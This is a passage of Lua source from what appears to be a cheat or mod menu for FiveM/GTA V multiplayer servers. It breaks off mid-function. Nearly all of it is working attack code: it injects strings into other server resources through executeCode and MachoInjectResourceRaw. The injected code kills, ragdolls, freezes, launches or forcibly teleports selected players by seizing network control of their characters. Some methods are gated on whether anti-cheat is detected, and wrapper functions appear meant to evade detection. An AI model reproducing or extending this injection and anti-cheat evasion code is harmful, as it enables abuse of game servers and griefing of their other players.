                                    WTP.SafeRunNative(Wait, 250)

                                    WTP.SafeRunNative(GiveWeaponToPed, playerPed, GetHashKey("gadget_parachute"), 1, false, true)

                                    for _, playerIdx in ipairs(GetActivePlayers()) do
                                        if GetPlayerServerId(playerIdx) == targetServerId then
                                            local targetPed = GetPlayerPed(playerIdx)
                                            local targetCoords = GetEntityCoords(targetPed)
                                            
                                            local underTargetZ = targetCoords.z - 50.0
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, playerPed, targetCoords.x, targetCoords.y, underTargetZ, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, playerPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, playerPed, 0, false)
                                            WTP.SafeRunNative(Wait, 500)
                                            WTP.SafeRunNative(TaskParachute, playerPed, false)
                                            
                                            local ticks = 0
                                            while not IsPedInParachuteFreeFall(playerPed) and ticks < 30 do
                                                WTP.SafeRunNative(Wait, 100)
                                                ticks = ticks + 1
                                            end
                                            if IsPedInParachuteFreeFall(playerPed) then
                                                WTP.SafeRunNative(ApplyForceToEntity, playerPed, 1, 0.0, 0.0, 90000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                            end
                                            
                                            WTP.SafeRunNative(Wait, 1000)
                                            WTP.SafeRunNative(SetEntityVisible, playerPed, true, false)
                                            WTP.SafeRunNative(SetEntityCollision, playerPed, true, true)
                                            WTP.SafeRunNative(ResetEntityAlpha, playerPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            break
                                        end
                                    end
                                ]], targetID))
                                self:Notify("success", "WTP", "Attempting to Send to Sky the Player", 5000)
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = {"Method 1", "Method 2"}, label = "Kill Player", desc = 'Kills selected player',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            WTP.SafeRunNative(CreateThread, function()
                                                local weaponName = 'vehicle_weapon_subcar_mg'
                                                local ammoAmount = 999
                                                local targetSid = %d
                                                local weapon = GetHashKey(weaponName)

                                                RequestWeaponAsset(weapon, 31, 26)
                                                while not HasWeaponAssetLoaded(weapon) do
                                                    Wait(0)
                                                end

                                                local selfPed = PlayerPedId()
                                                WTP.SafeRunNative(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTP.SafeRunNative(SetPedAmmo, selfPed, weapon, ammoAmount)
                                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                                if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                                    WTP.SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, 
                                                    targetCoords.x, targetCoords.y, targetCoords.z, 
                                                    999999, true, weapon, selfPed, true, false, 999999.0)
                                                    WTP.SafeRunNative(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                    WTP.SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                end

                                                WTP.SafeRunNative(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                                WTP.SafeRunNative(RemoveWeaponFromPed, selfPed, weapon)
                                                WTP.SafeRunNative(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                            end)
                                        ]], playerId))
                                    end
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local weaponName = 'weapon_appistol'
                                            local ammoAmount = 999
                                            local targetSid = %d

                                            WTP.SafeRunNative(CreateThread, function()
                                                local weapon = GetHashKey(weaponName)

                                                RequestWeaponAsset(weapon, 31, 26)
                                                while not HasWeaponAssetLoaded(weapon) do
                                                    Wait(0)
                                                end

                                                local selfPed = PlayerPedId()
                                                WTP.SafeRunNative(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                                WTP.SafeRunNative(SetPedAmmo, selfPed, weapon, ammoAmount)
                                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                                if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                    local targetCoords = GetEntityCoords(targetPed)
                                                    local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                                    WTP.SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)
                                                    WTP.SafeRunNative(SetPedUsingActionMode, selfPed, true, -1, 1)
                                                    WTP.SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                                end

                                                WTP.SafeRunNative(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                                WTP.SafeRunNative(RemoveWeaponFromPed, selfPed, weapon)
                                                WTP.SafeRunNative(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                            end)
                                        ]], playerId))
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Ragdoll Player",
                            desc = 'Force the selected player to fall over dont spam or you gonna killed the target.',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])
                                executeCode("any", string.format([[
                                    local targetSid = %d
                                    local weapon = 'weapon_snowball'

                                    WTP.SafeRunNative(CreateThread, function()
                                        RequestWeaponAsset(weapon, 31, 26)
                                        while not HasWeaponAssetLoaded(weapon) do Wait(0) end

                                        local selfPed = PlayerPedId()
                                        local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                        if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                            local boneTarget = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                                            local fromCoords = boneTarget + vec3(0.0, 0.0, 0.1)
                                            local forward = GetEntityForwardVector(targetPed)

                                            WTP.SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, boneTarget.x, boneTarget.y, boneTarget.z, 0, 
                                            true, weapon, selfPed, false, true, 0.0)
                                            WTP.SafeRunNative(SetPedUsingActionMode, selfPed, true, -1, 1)
                                            WTP.SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                            WTP.SafeRunNative(SetPedCanRagdoll, targetPed, true)
                                            WTP.SafeRunNative(SetPedToRagdoll, targetPed, 3000, 3000, 0, true, true, false)
                                            WTP.SafeRunNative(ApplyForceToEntity, targetPed, 1, -forward.x * 5.0, -forward.y * 5.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                        end

                                        WTP.SafeRunNative(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                        WTP.SafeRunNative(RemoveWeaponFromPed, selfPed, weapon)
                                        WTP.SafeRunNative(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                    end)
                                ]], targetID))
                                self:Notify("success", "WTP", "Ragdolled ID: " .. targetID, 3000)
                            end
                        },
                        {
                            type = "button",
                            label = "Make Player Invisible",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetID = tonumber(targetPlayers[1])

                                executeCode(targetSafeRes, string.format([[
                                    local targetId = %d
                                    local cmd = "carry"
                                    local myPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(myPed)

                                    local targetIdx = GetPlayerFromServerId(targetId)
                                    if targetIdx == -1 then return end
                                    local targetPed = GetPlayerPed(targetIdx)

                                    if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                    WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                    WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                    local currentPos = GetEntityCoords(targetPed)
                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                    WTP.SafeRunNative(Wait, 50)

                                    WTP.SafeRunNative(ExecuteCommand, cmd)
                                    WTP.SafeRunNative(Wait, 300)

                                    WTP.SafeRunNative(ExecuteCommand, cmd)
                                    WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                    WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                    WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                    WTP.SafeRunNative(ClearPedTasksImmediately, myPed)
                                    WTP.SafeRunNative(Wait, 100)

                                    WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                    local timeout = 0
                                    while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                        WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                        WTP.SafeRunNative(Wait, 10)
                                        timeout = timeout + 1
                                    end

                                    WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)
                                    WTP.SafeRunNative(Wait, 50)
                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                    WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                    WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                    WTP.SafeRunNative(Wait, 200)
                                    WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                ]], playerId))

                                self:Notify("success", "WTP", "Successfully make player invisible", 3000)
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Method 1", "Method 2", "Method 3", "Method 4" }, label = "Launch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Method 1" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTP.SafeRunNative(CreateThread, function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local ped = GetPlayerPed(targetPlayer)
                                                if not WTP.SafeRunNative(DoesEntityExist, ped) then return end

                                                local model = joaat("bmx")
                                                WTP.SafeRunNative(RequestModel, model)
                                                while not WTP.SafeRunNative(HasModelLoaded, model) do WTP.SafeRunNative(Wait, 0) end
                                                local coords = GetEntityCoords(ped)
                                                local obj = WTP.SafeRunNative(CreateObject, model, coords.x, coords.y, coords.z - 5.0, true, true, false)
                                                if not WTP.SafeRunNative(DoesEntityExist, obj) then return end
                                                WTP.SafeRunNative(SetEntityVisible, obj, false, false)
                                                WTP.SafeRunNative(SetEntityInvincible, obj, true)
                                                WTP.SafeRunNative(FreezeEntityPosition, obj, false)
                                                WTP.SafeRunNative(AttachEntityToEntityPhysically,
                                                    obj,
                                                    ped,
                                                    -1e38,
                                                    1e26,
                                                    0,
                                                    1e38,
                                                    -1e38,
                                                    800990.0,
                                                    19980.0,
                                                    1e26,
                                                    99999.0,
                                                    true,
                                                    true,
                                                    false,
                                                    false,
                                                    0
                                                )

                                                for i = 1, 20 do
                                                    if WTP.SafeRunNative(DoesEntityExist, obj) then
                                                        WTP.SafeRunNative(SetEntityVelocity, obj, 0.0, 0.0, 500.0 + (i * 50.0))
                                                        WTP.SafeRunNative(Wait, 10)
                                                    end
                                                end

                                                WTP.SafeRunNative(Wait, 100)
                                                WTP.SafeRunNative(DeleteEntity, obj)
                                                WTP.SafeRunNative(SetModelAsNoLongerNeeded, model)
                                            end)
                                        ]])
                                    end
                                    self:Notify("success", "WTP", "Launching Target...", 3000)
                                elseif value == "Method 2" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetRes, [[
                                            WTP.SafeRunNative(CreateThread, function()
                                                local targetId = tonumber(]] .. playerId .. [[)
                                                local targetPlayer = GetPlayerFromServerId(targetId)
                                                if targetPlayer == -1 then return end
                                                local me = GetPlayerPed(targetPlayer)
                                                if not WTP.SafeRunNative(DoesEntityExist, me) then return end

                                                local models = {joaat("adder"), joaat("bmx"), joaat("adder")}
                                                for _, m in ipairs(models) do
                                                    WTP.SafeRunNative(RequestModel, m)
                                                    while not WTP.SafeRunNative(HasModelLoaded, m) do WTP.SafeRunNative(Wait, 0) end
                                                end

                                                local function spawnAndYeet(modelName, forceZ, offsetMult)
                                                    local coords = GetEntityCoords(ped)
                                                    local obj = WTP.SafeRunNative(CreateObject, modelName, coords.x, coords.y, coords.z - 10.0, true, true, false)
                                                    if not WTP.SafeRunNative(DoesEntityExist, obj) then return end
                                                    WTP.SafeRunNative(SetEntityVisible, obj, false, false)
                                                    WTP.SafeRunNative(SetEntityInvincible, obj, true)
                                                    WTP.SafeRunNative(FreezeEntityPosition, obj, false)
                                                    
                                                    WTP.SafeRunNative(AttachEntityToEntityPhysically,
                                                        obj, me, 0, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
                                                        9999999.0, 9999999.0, 9999999.0, 25.0, 106.0, 900.0,
                                                        true, true, true, false, 0
                                                    )

                                                    for i = 1, 1500 do
                                                        if WTP.SafeRunNative(DoesEntityExist, obj) and WTP.SafeRunNative(DoesEntityExist, me) then
                                                            WTP.SafeRunNative(SetEntityCollision, me, false, false)
                                                            WTP.SafeRunNative(SetEntityVelocity, obj, 0.0, 0.0, 99999.0)
                                                            WTP.SafeRunNative(SetEntityVelocity, me, 0.0, 0.0, 99999.0)

                                                            local cur = GetEntityCoords(me)
                                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, me, cur.x, cur.y, cur.z + (500.0 * offsetMult), false, false, false)
                                                            WTP.SafeRunNative(Wait, 0)
                                                        end
                                                    end
                                                    WTP.SafeRunNative(DeleteEntity, obj)
                                                end

                                                spawnAndYeet(models[1], 50000000.0, 100)
                                                WTP.SafeRunNative(Wait, 10)
                                                spawnAndYeet(models[2], 80000000.0, 150)
                                                WTP.SafeRunNative(Wait, 10)
                                                spawnAndYeet(models[3], 999990999.0, 200)

                                                WTP.SafeRunNative(SetEntityCollision, me, true, true)
                                                for _, m in ipairs(models) do 
                                                    WTP.SafeRunNative(SetModelAsNoLongerNeeded, m)
                                                end
                                            end)
                                        ]])
                                    end
                                    self:Notify("success", "WTP", "Launch V2 Engaged", 3000)
                                elseif value == "Method 3" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        if IsDetections then
                                            self:Notify("info", "WTP", "Security detected Method disabled.", 3000)
                                        else
                                            executeCode(targetSafeRes, string.format([[
                                                local targetSid = %d
                                                local function GetPlayerFromServerId(serverId)
                                                    for _, player in ipairs(GetActivePlayers()) do
                                                        if GetPlayerServerId(player) == serverId then
                                                            return player
                                                        end
                                                    end
                                                    return nil
                                                end

                                                WTP.SafeRunNative(CreateThread, function()
                                                    local clientId = GetPlayerFromServerId(targetSid)
                                                    if not clientId then return end

                                                    local selected_ped = GetPlayerPed(clientId)
                                                    if not selected_ped or not IsEntityAPed(selected_ped) or selected_ped == PlayerPedId() then
                                                        return
                                                    end

                                                    local d = GetEntityCoords(PlayerPedId())
                                                    local selected_coords = GetEntityCoords(selected_ped)
                                                    local nearestVehicle = GetClosestVehicle(selected_coords.x, selected_coords.y, selected_coords.z, 100.0, 0, 71)

                                                    if not DoesEntityExist(nearestVehicle) then return end
                                                    WTP.SafeRunNative(Wait, 1000)
                                                    WTP.SafeRunNative(SetPedIntoVehicle, PlayerPedId(), nearestVehicle, -1)

                                                    local timer = GetGameTimer() + 1300
                                                    while (not WTP.SafeRunNative(NetworkHasControlOfEntity, nearestVehicle)) and GetGameTimer() < timer do
                                                        WTP.SafeRunNative(NetworkRequestControlOfEntity, nearestVehicle)
                                                        WTP.SafeRunNative(Wait, 1)
                                                    end

                                                    WTP.SafeRunNative(AttachEntityToEntityPhysically, 
                                                        nearestVehicle,
                                                        selected_ped,
                                                        -1e38,
                                                        1e26,
                                                        0,
                                                        1e38,
                                                        -1e38,
                                                        800990.0,
                                                        19980.0,
                                                        1e26,
                                                        99999.0,
                                                        true,
                                                        true,
                                                        false,
                                                        false,
                                                        0
                                                    )

                                                    WTP.SafeRunNative(ClearPedTasks, PlayerPedId())
                                                    WTP.SafeRunNative(SetEntityVisible, PlayerPedId(), true, true)
                                                    WTP.SafeRunNative(SetEntityCoordsNoOffset, PlayerPedId(), d.x, d.y, d.z, true, true, false)
                                                    WTP.SafeRunNative(Wait, 1)
                                                end)
                                            ]], playerId))
                                        end
                                    end
                                    self:Notify("success", "WTP", "Launch V3 Engaged", 3000)
                                elseif value == "Method 4" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        if IsDetections then
                                            self:Notify("info", "WTP", "Security detected Method disabled.", 3000)
                                        else
                                            MachoInjectResourceRaw(targetSafeRes, string.format([[ 
                                                local function SafeWrap(fn)
                                                    return function(...) return fn(...) end
                                                end

                                                local SafeThread = SafeWrap(CreateThread)
                                                local SafeWait = SafeWrap(Citizen.Wait)
                                                local SafePlayerPedId = SafeWrap(PlayerPedId)
                                                local SafeDoesEntityExist = SafeWrap(DoesEntityExist)
                                                local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
                                                local SafeSetEntityVisible = SafeWrap(SetEntityVisible)
                                                local SafeSetEntityInvincible = SafeWrap(SetEntityInvincible)
                                                local SafeSetEntityCollision = SafeWrap(SetEntityCollision)
                                                local SafeAttachEntityToEntityPhysically = SafeWrap(AttachEntityToEntityPhysically)
                                                local SafeDetachEntity = SafeWrap(DetachEntity)
                                                local SafeDeleteEntity = SafeWrap(DeleteEntity)
                                                local SafeSetEntityCoords = SafeWrap(SetEntityCoords)
                                                local SafeGetHashKey = SafeWrap(GetHashKey)
                                                local SafeRequestModel = SafeWrap(RequestModel)
                                                local SafeHasModelLoaded = SafeWrap(HasModelLoaded)
                                                local SafeCVehicle = SafeWrap(CreateVehicle)

                                                local function loadVehicleModel(model)
                                                    local modelHash = SafeGetHashKey(model)
                                                    SafeRequestModel(modelHash)
                                                    while not SafeHasModelLoaded(modelHash) do
                                                        SafeWait(0)
                                                    end
                                                    return modelHash
                                                end

                                                SafeThread(function()
                                                    local playerPed = SafePlayerPedId()
                                                    local playerCoords = SafeGetEntityCoords(playerPed)
                                                    local targetId = %d
                                                    local targetPlayer = GetPlayerFromServerId(targetId)
                                                    if targetPlayer == -1 then return end
                                                    local targetPed = GetPlayerPed(targetPlayer)
                                                    if not SafeDoesEntityExist(targetPed) then return end

                                                    local vehModel = "bmx"
                                                    local vehHash = loadVehicleModel(vehModel)

                                                    local ghostVeh = SafeCVehicle(vehHash, playerCoords.x, playerCoords.y, playerCoords.z - 5.0, 0.0, true, false)
                                                    if not SafeDoesEntityExist(ghostVeh) then return end

                                                    SafeSetEntityVisible(ghostVeh, false, 0)
                                                    SafeSetEntityInvincible(ghostVeh, true)
                                                    SafeSetEntityCollision(ghostVeh, false, false)

                                                    local _, groundZ = GetGroundZFor_3dCoord(playerCoords.x, playerCoords.y, playerCoords.z, 0)
                                                    local skyHeight = (groundZ or playerCoords.z) + 1500.0

                                                    SafeSetEntityCoords(ghostVeh, playerCoords.x, playerCoords.y, skyHeight, false, false, false, false)

                                                    SafeAttachEntityToEntityPhysically(
                                                        ghostVeh,
                                                        targetPed,
                                                        0, 0, 0,
                                                        0.0, 0.0, 0.0,
                                                        0.0, 0.0, 300.0,
                                                        true, true, true, false, 0
                                                    )

                                                    SafeWait(500)

                                                    SafeDetachEntity(ghostVeh, true, true)
                                                    SafeDeleteEntity(ghostVeh)

                                                    SafeSetEntityCoords(targetPed, playerCoords.x, playerCoords.y, skyHeight + 50.0, false, false, false, false)
                                                end)
                                            ]], playerId))
                                        end
                                    end
                                    self:Notify("success", "WTP", "Launch V4 Engaged", 3000)
                                end
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Air", "Chiliad", "Vinewood", "Maze Bank", "Death", "Agency Bunker", "Record A Bunker", "Meth Bunker", "After Hours Bunker", "Tunnel Bunker", "Waypoint", "Bring Target" }, label = "Bring Player", desc = 'This will attempt to bring player into specific location.',
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                if value == "Air" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            local highZ = currentPos.z + 700.0
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, highZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Air.", 3000)
                                elseif value == "Chiliad" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 450.0, 5580.0, 800.0

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Chiliad.", 3000)
                                elseif value == "Vinewood" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 742.40, 1271.51, 383.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Vinewood.", 3000)
                                elseif value == "Maze Bank" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -75.28, -818.84, 326.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

